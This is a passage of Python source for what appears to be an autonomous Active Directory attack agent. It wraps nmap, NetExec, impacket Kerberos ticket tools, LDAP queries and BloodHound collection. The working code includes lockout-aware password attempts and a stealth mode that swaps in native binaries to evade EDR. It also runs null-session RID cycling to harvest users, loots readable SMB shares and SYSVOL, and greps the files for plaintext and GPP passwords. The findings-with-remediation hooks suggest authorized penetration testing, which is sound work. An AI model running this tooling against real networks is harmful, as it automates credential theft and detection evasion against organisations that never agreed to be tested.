        threshold = int(m.group(1))
        policy["threshold"] = threshold
        # Stay well below threshold: use at most threshold-2 attempts
        policy["safe_count"] = max(1, threshold - 2) if threshold > 0 else 1

    m2 = re.search(r"Observation Window:\s*(\d+)", out, re.I)
    if m2:
        policy["observation_window"] = int(m2.group(1))

    SESSION.setdefault("agent_intel", {})["lockout_policy"] = policy
    return policy


def _opsec_tool_choice(preferred: str, native_alt: str = "") -> str:
    """In stealth mode, prefer native Windows/LOLBin alternatives over
    known offensive tools that get flagged by EDR."""
    edr = SESSION.get("agent_intel", {}).get("edr_detected", [])
    defender = SESSION.get("agent_intel", {}).get("defender", False)
    if OPSEC_MODE == "stealth" or (edr and defender):
        return native_alt or preferred
    return preferred


def _strip_ansi(text: str) -> str:
    """Remove ANSI escape codes — keeps MD reports clean."""
    return re.sub(r'\x1b\[[0-9;]*[mABCDEFGHJKSTfhilmnprsu]', '', text)


def _run(cmd: str, timeout: int = 60) -> str:
    """Execute shell command and return combined output (ANSI-stripped)."""
    _record_agent_command(cmd)
    try:
        r = subprocess.run(cmd, shell=True, capture_output=True,
                           text=True, timeout=timeout)
        return _strip_ansi((r.stdout + r.stderr).strip())
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT after {timeout}s]"
    except Exception as e:
        return f"[ERROR] {e}"


def _nxc(args: str, timeout: int = 60) -> str:
    """Run nxc with system impacket path first.
    The pip-installed impacket (0.14.0) is missing gkdi/dpapi_ng/WIN_VERSIONS
    that the system nxc requires. Setting PYTHONPATH fixes the version conflict.
    """
    env = os.environ.copy()
    sys_pkgs = "/usr/lib/python3/dist-packages"
    existing = env.get("PYTHONPATH", "")
    env["PYTHONPATH"] = f"{sys_pkgs}:{existing}" if existing else sys_pkgs
    _record_agent_command(f"nxc {args}")
    try:
        r = subprocess.run(f"nxc {args}", shell=True, capture_output=True,
                           text=True, timeout=timeout, env=env)
        return _strip_ansi((r.stdout + r.stderr).strip())
    except subprocess.TimeoutExpired:
        return f"[TIMEOUT after {timeout}s]"
    except Exception as e:
        return f"[ERROR] {e}"


def _list_run(args: list, timeout: int = 60, env: dict | None = None) -> str:
    """Execute command as list (no shell, safe for passwords with special chars)."""
    _record_agent_command(shlex.join(str(a) for a in args))
    try:
        r = subprocess.run(args, capture_output=True, text=True, timeout=timeout, env=env)
        return _strip_ansi((r.stdout + r.stderr).strip())
    except Exception as e:
        return f"[ERROR] {e}"


def _bin(name: str) -> str:
    """Resolve user-installed security tools that /bin/sh PATH often misses."""
    names = [name]
    if name.lower() == "bloodyad":
        names += ["bloodyAD", "bloodyad"]
    for candidate in names:
        found = shutil.which(candidate)
        if found:
            return found
    home_candidates = {Path.home()}
    for candidate in names:
        for base in home_candidates:
            path = base / ".local" / "bin" / candidate
            if path.exists():
                return str(path)
        for path in (Path("/usr/local/bin") / candidate, Path("/usr/bin") / candidate):
            if path.exists():
                return str(path)
    return name


def _dc_time() -> str:
    """Get DC's current time for faketime alignment.

    Priority order (most reliable first for AD labs):
      1. LDAP rootDSE currentTime  — port 389 always open, no credentials needed
      2. HTTP Date header           — only when DC has a web server
      3. HTTPS Date header          — ADCS web enrollment on 443
      4. ntpdate -q offset          — NTP query without stepping the clock
    Returns a faketime-compatible timestamp string or '' if all methods fail.
    """
    import datetime
    dc_ip  = SESSION.get("dc_ip", "")
    dc_fqdn = SESSION.get("dc_fqdn", "") or dc_ip

    def _localtime_from_dc_utc(dc_utc_str: str) -> str:
        """Convert a UTC datetime string to a local faketime string (+5s buffer)."""
        try:
            dc_dt     = datetime.datetime.strptime(dc_utc_str, "%Y-%m-%d %H:%M:%S")
            utc_now   = datetime.datetime.utcnow()
            local_now = datetime.datetime.now()
            delta     = dc_dt - utc_now
            fake      = local_now + delta + datetime.timedelta(seconds=5)
            return fake.strftime("%Y-%m-%d %H:%M:%S")
        except Exception:
            return ""

    # ── 1. LDAP rootDSE currentTime (most reliable — port 389 always open) ────
    for ldap_host in filter(None, {dc_ip, dc_fqdn}):
        try:
            out = _run(
                f"ldapsearch -x -H ldap://{ldap_host} -s base -b '' currentTime 2>/dev/null",
                timeout=6,
            )
            # currentTime: 20260507035012.0Z
            m = re.search(r"currentTime:\s*(\d{14})", out)
            if m:
                ts = m.group(1)  # YYYYMMDDHHmmss
                dc_dt = datetime.datetime.strptime(ts, "%Y%m%d%H%M%S")
                dc_utc = dc_dt.strftime("%Y-%m-%d %H:%M:%S")
                t = _localtime_from_dc_utc(dc_utc)
                if t:
                    return t
        except Exception:
            pass

    def _parse_curl_date(text: str) -> str:
        for line in text.splitlines():
            if line.lower().startswith("date:"):
                try:
                    from email.utils import parsedate_to_datetime
                    dt = parsedate_to_datetime(line[5:].strip())
                    dc_utc = dt.strftime("%Y-%m-%d %H:%M:%S")
                    return _localtime_from_dc_utc(dc_utc)
                except Exception:
                    pass
        return ""

    # ── 2 & 3. HTTP / HTTPS Date header ───────────────────────────────────────
    for url in (f"http://{dc_ip}", f"https://{dc_ip}",
                f"http://{dc_fqdn}", f"https://{dc_fqdn}"):
        try:
            out = _run(f"curl -sk --max-time 5 -I {url}", timeout=8)
            t = _parse_curl_date(out)
            if t:
                return t
        except Exception:
            pass

    # ── 4. ntpdate -q (query only, doesn't set the clock) ────────────────────
    for probe in filter(None, (dc_fqdn, dc_ip)):
        try:
            out = _run(f"ntpdate -q {probe} 2>&1", timeout=8)
            m = re.search(r"offset\s+([+-]?\d+(?:\.\d+)?)", out)
            if m:
                offset_s  = float(m.group(1))
                local_now = datetime.datetime.now()
                fake = local_now + datetime.timedelta(seconds=offset_s + 5)
                return fake.strftime("%Y-%m-%d %H:%M:%S")
        except Exception:
            pass
    return ""


def _faketime_prefix() -> str:
    t = _dc_time()
    return f'faketime "{t}" ' if t and shutil.which("faketime") else ""


def _auth_args_nxc(username: str, password: str = "", nt_hash: str = "",
                   domain: str = "", dc_ip: str = "") -> str:
    dom = domain or SESSION.get("domain", "")
    kdc = dc_ip or SESSION.get("dc_ip", "")
    nt_hash = _real_nt_hash(nt_hash)
    password = _real_secret(password)
    if SESSION.get("ntlm_disabled") and _session_kerberos_usable(username, dom):
        return f"-u '{username}' -k --use-kcache --kdcHost {kdc} -d {dom}"
    if nt_hash:
        return f"-u '{username}' -H '{nt_hash}' -d {dom}"
    if password and not SESSION.get("ntlm_disabled"):
        return f"-u '{username}' -p '{password}' -d {dom}"
    # Kerberos only when the cache is actually usable; stale caches otherwise
    # cause NetExec to bind as an empty/expired principal and hide real paths.
    if _session_kerberos_usable(username, dom):
        return f"-u '{username}' -k --use-kcache --kdcHost {kdc} -d {dom}"
    if password:
        return f"-u '{username}' -p '{password}' -d {dom}"
    return f"-u '' -p '' -d {dom}"


def _getTGT(user: str, password: str, domain: str, dc: str) -> str:
    """Get TGT via getTGT.py with optional faketime bypass.

    If _dc_time() returns a timestamp we wrap with faketime (handles labs where
    the DC clock differs from the attacker clock).  If _dc_time() fails (e.g.
    DC has no HTTP/HTTPS server) we try without faketime first — ntpdate may
    have already synced the system clock — and only give up if both fail.
    Returns the ccache path or ''.
    """
    tgt_py = os.path.expanduser("~/.local/bin/getTGT.py")
    if not Path(tgt_py).exists():
        tgt_py = "/usr/share/doc/python3-impacket/examples/getTGT.py"
    if not Path(tgt_py).exists():
        return ""

    fake_ts = _dc_time()
    ccache = f"/tmp/{user}_{int(time.time())}.ccache"

    def _try_tgt(use_faketime: bool) -> str:
        if use_faketime and fake_ts and shutil.which("faketime"):
            args = ["faketime", fake_ts, "/usr/bin/python3", tgt_py,
                    f"{domain}/{user}:{password}", "-dc-ip", dc]
        else:
            args = ["/usr/bin/python3", tgt_py,
                    f"{domain}/{user}:{password}", "-dc-ip", dc]
        out = _list_run(args, timeout=20)
        if "Saving ticket" in out:
            default = f"{user}.ccache"
            dest = ccache
            if Path(default).exists():
                try:
                    shutil.move(default, dest)
                except Exception:
                    dest = default
            os.environ["KRB5CCNAME"] = dest
            return dest
        return ""

    # Prefer faketime when we have a DC timestamp
    if fake_ts:
        result = _try_tgt(use_faketime=True)
        if result:
            return result
    # Fallback: system clock (ntpdate may have already synced it)
    return _try_tgt(use_faketime=False)


def _prefetch_ldap_tgs(domain: str, dc_ip: str, dc_fqdn: str = "") -> str:
    """Pre-fetch a service ticket for ldap/<dc_fqdn> and merge it into the
    session ccache. This is a workaround for the very common failure mode where
    bloodhound-python / bloodyAD / certipy read a TGT from cache but then crash
    inside their own getKerberosTGS() (e.g. `IndexError: list index out of range`)
    because no LDAP TGS is cached. Once we pre-cache the TGS, those clients can
    bind cleanly via Kerberos.

    Returns the (possibly updated) ccache path, or '' if pre-fetch failed.
    Idempotent — safe to call multiple times.
    """
    if not (SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")):
        return ""
    ccache = SESSION["krb5_ccache"]
    if not Path(ccache).exists():
        return ""

    fqdn = (dc_fqdn or _dc_host_for_kerberos(domain, dc_ip) or "").lower().strip()
    if not fqdn:
        return ccache
    user = SESSION.get("username", "")
    if not user:
        return ccache
    realm = domain.upper()

    # Quick check: does the ccache already have a usable LDAP/GC TGS? Skip work if so.
    klist_out = _run(f"klist -c {shell_quote(ccache)} 2>&1", timeout=5)
    if f"ldap/{fqdn}" in klist_out.lower() or f"gc/{fqdn}" in klist_out.lower():
        return ccache

    getst_py = os.path.expanduser("~/.local/bin/getST.py")
    if not Path(getst_py).exists():
        getst_py = "/usr/share/doc/python3-impacket/examples/getST.py"
    if not Path(getst_py).exists():
        return ccache  # impacket missing — caller can fall back

    krb5_conf = _target_krb5_config(dc_ip, domain, fqdn)
    env = os.environ.copy()
    env["KRB5CCNAME"] = ccache
    env["KRB5_CONFIG"] = krb5_conf

    fake_ts = _dc_time()
    base = ["faketime", fake_ts] if (fake_ts and shutil.which("faketime")) else []

    host = fqdn.split(".")[0]
    spns = [
        f"ldap/{fqdn}", f"ldap/{fqdn}@{realm}",
        f"ldap/{host}", f"ldap/{host}@{realm}",
        f"gc/{fqdn}", f"gc/{fqdn}@{realm}",
        f"gc/{host}", f"gc/{host}@{realm}",
        f"cifs/{fqdn}", f"cifs/{fqdn}@{realm}",
    ]
    diag = []
    kvno = shutil.which("kvno")
    if kvno:
        for spn in spns:
            kvno_cmd = base + [kvno, spn]
            try:
                r = subprocess.run(kvno_cmd, capture_output=True, text=True,
                                   timeout=15, env=env)
                diag.append(f"kvno {spn}: rc={r.returncode} {(r.stdout + r.stderr).strip()[:180]}")
            except Exception as e:
                diag.append(f"kvno {spn}: {e}")
                continue
            klist_after = _run(f"klist -c {shell_quote(ccache)} 2>&1", timeout=5)
            if "ldap/" in klist_after.lower() or "gc/" in klist_after.lower():
                SESSION.setdefault("agent_intel", {}).setdefault("ccaches", [])
                if ccache not in SESSION["agent_intel"]["ccaches"]:
                    SESSION["agent_intel"]["ccaches"].append(ccache)
                SESSION.setdefault("agent_intel", {})["tgs_prefetch_diag"] = diag[-6:]
                return ccache

    save_re = re.compile(r"Saving ticket in\s+(\S+\.ccache)", re.I)
    for spn in spns:
        cmd = base + [_SYSPY, getst_py, "-spn", spn, "-k", "-no-pass",
                      "-dc-ip", dc_ip, f"{domain}/{user}"]
        try:
            r = subprocess.run(cmd, capture_output=True, text=True,
                               timeout=20, env=env)
            out = _strip_ansi((r.stdout + r.stderr).strip())
            diag.append(f"getST {spn}: rc={r.returncode} {out[:180]}")
        except Exception as e:
            diag.append(f"getST {spn}: {e}")
            continue
        if "Saving ticket" not in out:
            continue
        # Modern impacket writes the new TGS to a file named
        # "<user>@<spn-with-/-replaced>@<realm>.ccache" rather than to
        # KRB5CCNAME. Parse that filename and merge the credential into the
        # session ccache so downstream tools (bloodyAD/certipy) can use it.
        merged = False
        m = save_re.search(out)
        candidates = []
        if m:
            candidates.append(Path(m.group(1)))
        candidates.append(Path(f"{user}.ccache"))
        for src in candidates:
            if not src.exists():
                continue
            try:
                from impacket.krb5.ccache import CCache as _CC
                if Path(ccache).exists():
                    dst_cc = _CC.loadFile(ccache)
                    src_cc = _CC.loadFile(str(src))
                    for cr in src_cc.credentials:
                        dst_cc.credentials.append(cr)
                    dst_cc.saveFile(ccache)
                else:
                    shutil.move(str(src), ccache)
                merged = True
            except Exception as e:
                diag.append(f"merge {src.name}: {e}")
            try:
                if src.exists() and str(src) != ccache:
                    src.unlink()
            except Exception:
                pass
            if merged:
                break
        # Verify with klist; bail out as soon as one SPN was merged.
        klist_after = _run(f"klist -c {shell_quote(ccache)} 2>&1", timeout=5)
        if "ldap/" in klist_after.lower() or "gc/" in klist_after.lower():
            SESSION.setdefault("agent_intel", {})["tgs_prefetch_diag"] = diag[-6:]
            return ccache
    SESSION.setdefault("agent_intel", {})["tgs_prefetch_diag"] = diag[-8:]
    return ccache


def _has_directory_tgs(ccache: str, dc_fqdn: str = "") -> bool:
    if not ccache or not Path(ccache).exists():
        return False
    out = _run(f"klist -c {shell_quote(ccache)} 2>&1", timeout=5).lower()
    if not out or "no credentials cache" in out:
        return False
    if "ldap/" in out or "gc/" in out:
        return True
    fqdn = str(dc_fqdn or "").lower().strip()
    return bool(fqdn and (f"ldap/{fqdn}" in out or f"gc/{fqdn}" in out))


# ── Tool handlers ─────────────────────────────────────────────────────────────

def tool_nmap_scan(target_ip: str) -> str:
    ports = "53,80,88,135,139,389,443,445,464,593,636,1433,3268,3269,3389,5985,5986,8080,8443,8530,8531,9389"
    info(f"Running nmap on {target_ip}...")
    out = _run(f"nmap -sV --version-intensity 0 -p {ports} --open -T5 --min-rate 5000 {target_ip}", timeout=60)

    open_ports = []
    for line in out.splitlines():
        # Open port line: "445/tcp   open  microsoft-ds"
        m_port = re.match(r"\s*(\d+)/tcp\s+open", line)
        if m_port:
            open_ports.append(m_port.group(1))

        m = re.search(r"Domain:\s*([\w\.-]+)", line)
        if m and not SESSION.get("domain"):
            dom = m.group(1).rstrip("0")
            SESSION["domain"] = dom
            SESSION["base_dn"] = "DC=" + dom.replace(".", ",DC=")
        m2 = re.search(r"DNS:([A-Za-z0-9\-]+\.[\w\.-]+)", line)
        if m2 and not SESSION.get("dc_fqdn"):
            SESSION["dc_fqdn"] = m2.group(1)

    SESSION["dc_ip"] = target_ip
    # Store open ports so other tools can check availability without re-scanning
    if open_ports:
        SESSION.setdefault("agent_intel", {})["open_ports"] = open_ports
        # Nmap-time SMB banners are only hints. Do not switch the whole agent
        # into Kerberos mode until a credentialed enum/auth step proves NTLM is
        # actually blocked; otherwise Round 2 jumps to request_tgt too early.
        if "445" in open_ports:
            smb_ntlm_check = _run(
                f"nxc smb {target_ip} 2>&1 | grep -i 'NTLM'", timeout=10
            )
            if "NTLM:False" in smb_ntlm_check or "ntlm: false" in smb_ntlm_check.lower():
                SESSION["ntlm_disabled_hint"] = True
                SESSION.setdefault("agent_intel", {})["ntlm_disabled_hint"] = True
    save_session()
    return f"NMAP OUTPUT:\n{out[:3000]}"


def _ldap3_query(dc_ip: str, domain: str, username: str, password: str,
                 base_dn: str, ldap_filter: str, attrs: list,
                 use_ssl: bool = True, timeout: int = 30) -> str:
    """LDAP query using ldap3 library — works with both password and Kerberos (via SASL/GSSAPI)."""
    try:
        import ldap3
        krb    = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")
        ccache = SESSION.get("krb5_ccache", "")

        port   = 636 if use_ssl else 389
        ldap_host = _dc_host_for_kerberos(domain, dc_ip) if krb else dc_ip
        server = ldap3.Server(ldap_host, port=port, use_ssl=use_ssl,
                              get_info=ldap3.ALL, connect_timeout=timeout)

        if krb and ccache:
            # Kerberos SASL — uses existing ccache, no password needed
            os.environ["KRB5CCNAME"] = ccache
            try:
                import gssapi
                conn = ldap3.Connection(
                    server,
                    authentication=ldap3.SASL,
                    sasl_mechanism=ldap3.KERBEROS,
                    auto_bind=True)
            except Exception:
                return "[ldap3 error] Kerberos SASL/GSSAPI bind failed; using nxc/BloodHound Kerberos fallbacks"
        else:
            conn = ldap3.Connection(
                server,
                user=f"{username}@{domain}",
                password=password,
                authentication=ldap3.SIMPLE,
                auto_bind=True)

        conn.search(base_dn, ldap_filter,
                    attributes=attrs or ldap3.ALL_ATTRIBUTES,
                    time_limit=timeout)

        lines = []
        for entry in conn.entries:
            lines.append(f"dn: {entry.entry_dn}")
            for attr in entry.entry_attributes:
                val = entry[attr].value
                if isinstance(val, list):
                    for v in val:
                        lines.append(f"{attr}: {v}")
                else:
                    lines.append(f"{attr}: {val}")
            lines.append("")
        conn.unbind()
        return "\n".join(lines) if lines else "(no results)"
    except Exception as e:
        return f"[ldap3 error] {e}"


def _ldap_object_classes(dc_ip: str, domain: str, username: str,
                         password: str = "", nt_hash: str = "",
                         sam: str = "", timeout: int = 10) -> set:
    """Best-effort LDAP objectClass lookup for an AD sAMAccountName."""
    sam = str(sam or "").strip().strip("'\"")
    if not sam or not domain:
        return set()
    base_dn = "DC=" + domain.replace(".", ",DC=")
    escaped_sam = sam.replace("\\", "\\5c").replace("(", "\\28").replace(")", "\\29")
    krb = SESSION.get("use_kerberos") and SESSION.get("krb5_ccache")
    out = ""
    if krb or _real_secret(password):
        out = _ldap3_query(
            dc_ip, domain, username, _real_secret(password),
            base_dn, f"(sAMAccountName={escaped_sam})",
            ["objectClass", "sAMAccountName"], use_ssl=False, timeout=timeout,
        )
    if not out or out.startswith("[ldap3 error]"):
        auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
        out = _nxc(
            f"ldap {shell_quote(dc_ip)} {auth} --query "
            f"{shell_quote(f'(sAMAccountName={escaped_sam})')} objectClass",
            timeout=timeout,
        )
    classes = {
        m.group(1).strip().lower()
        for m in re.finditer(r"objectClass:\s*([^\r\n]+)", out or "", re.I)
    }
    if "msds-groupmanagedserviceaccount" in (out or "").lower():
        classes.add("msds-groupmanagedserviceaccount")
    if re.search(r"\bcomputer\b", out or "", re.I):
        classes.add("computer")
    return classes


def tool_enumerate_ldap(dc_ip: str, domain: str, username: str,
                        password: str = "", nt_hash: str = "") -> str:
    """LDAP enumeration — works with credentials, null session, or Kerberos.
    Handles large domains (10k+ users) with paged LDAP queries and longer timeouts."""
    base_dn = "DC=" + domain.replace(".", ",DC=")
    results = []

    # Null session / anonymous LDAP (no credentials needed for many domains)
    _anon_ldap = not username and not password and not nt_hash
    if _anon_ldap:
        results.append("=== ANONYMOUS LDAP ENUMERATION ===")
        # Try anonymous bind for user enumeration (common in legacy environments)
        anon_out = _run(
            f"ldapsearch -x -H ldap://{dc_ip} -b '{base_dn}' "
            f"'(&(objectClass=user)(objectCategory=person))' "
            f"sAMAccountName userAccountControl 2>/dev/null | "
            f"grep -E 'sAMAccountName:|userAccountControl:' | head -100",
            timeout=30
        )
        results.append(f"Anonymous users:\n{anon_out[:1500] or 'Anonymous LDAP bind denied'}")

        # RID cycling via lookupsid (works without credentials)
        lookupsid = _impacket_cmd("lookupsid")
        rid_out = _run(
            f"{lookupsid} '{domain}/' {dc_ip} 2>&1 | head -60",
            timeout=30
        )
        results.append(f"=== RID CYCLING (null session) ===\n{rid_out[:1500]}")

        # Extract usernames from RID output and save
        users = re.findall(r"SidTypeUser\)\s+(.+)", rid_out)
        users = [u.split("\\")[-1] for u in users if "\\" in u]
        if users:
            Path("/tmp/users.txt").write_text("\n".join(users))
            results.append(f"Found {len(users)} users via RID cycling → /tmp/users.txt")
            SESSION.setdefault("agent_intel", {})["users"] = users

        return "\n\n".join(results)

    # Authenticated enumeration — ldap3 with paged results for large domains
    # Use 60s timeout (30s is too short for 10k+ user domains)
    out  = _ldap3_query(dc_ip, domain, username, password, base_dn,
                        "(objectClass=user)",
                        ["sAMAccountName","userAccountControl","memberOf",
                         "description","servicePrincipalName","adminCount",
                         "scriptPath","homeDirectory","profilePath"],
                        timeout=60)
    out2 = _ldap3_query(dc_ip, domain, username, password, base_dn,
                        "(objectClass=group)",
                        ["cn","member","description"],
                        timeout=30)
    out3 = _ldap3_query(dc_ip, domain, username, password, base_dn,
                        "(objectClass=domainDNS)",
                        ["lockoutThreshold","lockoutDuration",
                         "minPwdLength","maxPwdAge"],
                        timeout=15)

    results.append(f"=== USERS ===\n{out[:2500]}")
    results.append(f"=== GROUPS ===\n{out2[:1000]}")
    results.append(f"=== PASSWORD POLICY ===\n{out3[:500]}")

    # nxc ldap — prefer Kerberos when NTLM is disabled
    # Never pass NT hash to nxc ldap when NTLM is off (STATUS_NOT_SUPPORTED)
    _krb_active = _session_kerberos_usable(username, domain)
    _ntlm_off   = SESSION.get("ntlm_disabled") or SESSION.get("agent_intel", {}).get("ntlm_disabled")
    if _krb_active:
        auth = _auth_args_nxc(username, "", "", domain, dc_ip)  # Kerberos ccache
    elif _ntlm_off:
        results.append("=== NXC LDAP USERS ===\nNTLM disabled — skipping NTLM-based LDAP query")
        nxc_out = ""
    else:
        auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
    ldap_host = _dc_host_for_kerberos(domain, dc_ip) if _krb_active else dc_ip
    if not _ntlm_off or _krb_active:
        nxc_out = _nxc(f"ldap {ldap_host} {auth} --users", timeout=60)
        results.append(f"=== NXC LDAP USERS ===\n{nxc_out[:1500]}")

    # Save to disk
    out_path = Path(SESSION.get("output_dir") or str(OUTPUT_DIR)) / "enum"
    out_path.mkdir(exist_ok=True)
    (out_path / "ldap_users.txt").write_text(out)
    (out_path / "ldap_groups.txt").write_text(out2)

    return "\n\n".join(results)


def tool_enumerate_shares(dc_ip: str, domain: str, username: str,
                          password: str = "", nt_hash: str = "") -> str:
    # SMB-over-Kerberos requires SPN cifs/<fqdn> — using a bare IP yields a
    # silently empty nxc output. Force FQDN when Kerberos mode is on, and
    # always keep a credential-based fallback ready for the (very common) case
    # where Kerberos is misconfigured but NTLM still works.
    fqdn = (SESSION.get("dc_fqdn")
            or _valid_dc_fqdn(domain)
            or _dc_host_for_kerberos(domain, dc_ip)
            or "")
    krb_active = bool(SESSION.get("use_kerberos") and SESSION.get("krb5_ccache"))
    pw         = _real_secret(password)
    nh         = _real_nt_hash(nt_hash)

    auth_krb  = _auth_args_nxc(username, "", "", domain, dc_ip) if krb_active else ""
    auth_pw   = ""
    if nh:
        auth_pw = f"-u '{username}' -H '{nh}' -d {domain}"
    elif pw:
        auth_pw = f"-u '{username}' -p '{pw}' -d {domain}"

    shares_out = ""
    chosen     = ""

    if krb_active and fqdn:
        shares_out = _nxc(f"smb {shell_quote(fqdn)} {auth_krb} --shares", timeout=30)
        chosen = "kerberos"

    # Fallback to NTLM/hash if Kerberos returned nothing parseable
    if not re.search(r"\b(READ|WRITE|Disk|IPC)\b", shares_out, re.I) and auth_pw:
        ntlm_out = _nxc(f"smb {shell_quote(dc_ip)} {auth_pw} --shares", timeout=30)
        if re.search(r"\b(READ|WRITE|Disk|IPC)\b", ntlm_out, re.I):
            shares_out = ntlm_out
            chosen = "ntlm"
        elif not shares_out:
            shares_out = ntlm_out  # at least surface the diagnostic

    if not re.search(r"\b(READ|WRITE|Disk|IPC)\b", shares_out, re.I) and not auth_pw and not krb_active:
        null_out = _nxc(f"smb {shell_quote(dc_ip)} -u '' -p '' -d {shell_quote(domain)} --shares", timeout=20)
        guest_out = _nxc(f"smb {shell_quote(dc_ip)} -u 'guest' -p '' -d {shell_quote(domain)} --shares", timeout=20)
        shares_out = "\n".join(x for x in (null_out, guest_out) if x.strip())
        chosen = "null/guest"

    if not shares_out.strip():
        shares_out = "(empty — both Kerberos and NTLM share enumeration returned no output)"

    results = [f"=== SHARES (auth={chosen or 'ntlm'}) ===\n{shares_out}"]

    # Find readable shares
    readable = re.findall(r"([\w\$\-]+)\s+READ", shares_out)
    skip = {"NETLOGON", "SYSVOL", "IPC$", "ADMIN$", "C$", "print$"}

    for share in readable:
        if share in skip:
            continue
        dest = Path("/tmp/agent_loot") / share
        dest.mkdir(parents=True, exist_ok=True)
        old_cwd = os.getcwd()
        os.chdir(dest)
        if pw or username:
            smb_auth = f"-U '{domain}\\{username}%{pw}'"
        else:
            smb_auth = "-N"
        _run(f"smbclient //{dc_ip}/{share} {smb_auth} "
             f"-c 'prompt OFF; recurse ON; mget *' 2>/dev/null", timeout=30)
        os.chdir(old_cwd)

        files = list(dest.rglob("*"))
        results.append(f"=== SHARE: {share} ({len(files)} files) ===")

        for f in files:
            if not f.is_file() or f.suffix.lower() not in \
               {".log", ".txt", ".conf", ".config", ".ini", ".xml", ".json",
                ".ps1", ".bat", ".cmd", ".env", ""}:
                continue
            try:
                content = f.read_text(errors="ignore")
            except Exception:
                continue
            found = _extract_creds_from_text(content)
            if found:
                found_u = sorted({item["user"] for item in found})
                found_pw = sorted({item["password"] for item in found})
                results.append(f"  CREDS in {f.name}: users={found_u} passwords={found_pw}")
                add_finding("Credentials in Share File", "Critical",
                            f"Plaintext credentials found in {share}/{f.name}: {found_u}:{found_pw}",
                            "Audit file share contents; rotate credentials")

    # Also search SYSVOL for GPP
    if pw or username:
        sysvol_auth = f"-U '{domain}\\{username}%{pw}'"
    else:
        sysvol_auth = "-N"
    gpp_out = _run(
        f"smbclient //{dc_ip}/SYSVOL {sysvol_auth} "
        f"-c 'recurse ON; prompt OFF; mget *.xml' 2>/dev/null && "
        f"grep -r 'cpassword' /tmp/agent_loot/ 2>/dev/null | head -10", timeout=30)
    if "cpassword" in gpp_out.lower():
        results.append(f"=== GPP PASSWORD FOUND ===\n{gpp_out}")
        add_finding("GPP Password in SYSVOL", "Critical",
                    "Group Policy Preferences password found in SYSVOL",
                    "Remove GPP passwords; patch MS14-025")

    return "\n".join(results)


def tool_collect_bloodhound(dc_ip: str, domain: str, username: str,
                            password: str = "", nt_hash: str = "",
                            use_kerberos: bool = False) -> str:
    def _bh_auth_rejected(text: str) -> bool:
        lower = (text or "").lower()
        return any(s in lower for s in (
            "data 52e",
            "invalidcredentials",
            "invalid credentials",
            "failure to authenticate with ldap",
            "kdc_err_preauth_failed",
            "pre-authentication information was invalid",
            "status_logon_failure",
        ))

    def _bh_failure_excerpt(text: str, limit: int = 1800) -> str:
        lines = []
        for line in (text or "").splitlines():
            low = line.lower()
            if "traceback" in low or line.lstrip().startswith("file "):
                break
            lines.append(line)
        cleaned = "\n".join(lines).strip() or (text or "").strip()
        return cleaned[:limit]

    out_dir = str(Path("/tmp/agent_bloodhound"))
    out_path = Path(out_dir)
    out_path.mkdir(exist_ok=True)
    for stale in list(out_path.glob("*.zip")) + list(out_path.glob("*.json")):
        stale.unlink(missing_ok=True)
    password = _real_secret(password) or _real_secret(SESSION.get("password", ""))
    nt_hash = _real_nt_hash(nt_hash) or _real_nt_hash(SESSION.get("nt_hash", ""))
    updates = {"dc_ip": dc_ip, "domain": domain, "username": username}
    if password:
        updates["password"] = password
    if nt_hash:
        updates["nt_hash"] = nt_hash
    SESSION.update(updates)
    dc_fqdn = _valid_dc_fqdn(domain, _dc_host_for_kerberos(domain, dc_ip))
    krb     = _session_kerberos_usable(username, domain)
    ccache  = SESSION.get("krb5_ccache", "")
    if krb and not _ccache_is_valid(ccache, username, domain):
        retry_ccache = _getTGT(username, password, domain, dc_ip) if password else ""
        if retry_ccache and _ccache_is_valid(retry_ccache, username, domain):
            SESSION["krb5_ccache"] = retry_ccache
            SESSION["use_kerberos"] = True
            os.environ["KRB5CCNAME"] = retry_ccache
            ccache = retry_ccache
            krb = True
        else:
            SESSION["use_kerberos"] = False
            SESSION["krb5_ccache"] = ""
            os.environ.pop("KRB5CCNAME", None)
            krb = False
            ccache = ""
    # Even when krb=False (no cached ticket), try to obtain a fresh TGT when
    # NTLM is known to be disabled — bloodhound cannot work without Kerberos.
    ntlm_off_early = SESSION.get("ntlm_disabled") or SESSION.get("agent_intel", {}).get("ntlm_disabled")
    if not (krb and ccache) and password and ntlm_off_early:
        _fresh = _getTGT(username, password, domain, dc_ip)
        if _fresh and _ccache_is_valid(_fresh, username, domain):
            SESSION["krb5_ccache"] = _fresh
            SESSION["use_kerberos"] = True
            os.environ["KRB5CCNAME"] = _fresh
            ccache = _fresh
            krb = True
    krb5_conf = _target_krb5_config(dc_ip, domain, dc_fqdn) if krb else SESSION.get("krb5_config", "")
    dns_opts = f"-ns {dc_ip} --dns-tcp --dns-timeout 2 --disable-autogc"
    if dc_fqdn:
        dns_opts = f"-dc {dc_fqdn} -gc {dc_fqdn} {dns_opts}"
    out_prefix = str(Path(out_dir) / "bh")
    common = f"-d {domain} {dns_opts} -c All --zip -op {out_prefix}"
    bh_env = ""
    bh_exec = "bloodhound-python"
    if dc_fqdn:
        wrapper = _bloodhound_ipv4_wrapper()
        bh_env = (
            f"ADSTRIKE_BH_HOST={shell_quote(dc_fqdn)} "
            f"ADSTRIKE_BH_DOMAIN={shell_quote(domain)} "
            f"ADSTRIKE_BH_IP={shell_quote(dc_ip)} "
        )
        bh_exec = f"{shell_quote(_SYSPY)} {shell_quote(wrapper)}"
    # bloodhound-python issues live TGS-REQs whose authenticators carry the
    # local clock — wrap with faketime so KDCs in skewed labs/domains accept
    # them. Without this you get "Kerberos auth to LDAP failed, no
    # authentication methods left" which actually means KDC_AP_ERR_SKEW.
    ftpfx = _faketime_prefix() if (krb and ccache) else ""
    retry_notes = []

    if krb and ccache:
        # Kerberos mode — NTLM disabled environments.
        # Pre-fetch ldap/<dc> TGS so bloodhound-python's getKerberosTGS() doesn't
        # crash on an empty ccache lookup. Without this you'll see
        # "Kerberos auth to LDAP failed, no authentication methods left".
        ccache = _prefetch_ldap_tgs(domain, dc_ip, dc_fqdn) or ccache
        SESSION["krb5_ccache"] = ccache
        if not _has_directory_tgs(ccache, dc_fqdn):
            diag = SESSION.get("agent_intel", {}).get("tgs_prefetch_diag", [])
            retry_notes.append(
                "Kerberos ccache has a TGT but no LDAP/GC service ticket; BloodHound may fail on legacy getKerberosTGS."
                + (f" TGS prefetch diagnostics: {diag}" if diag else "")
            )
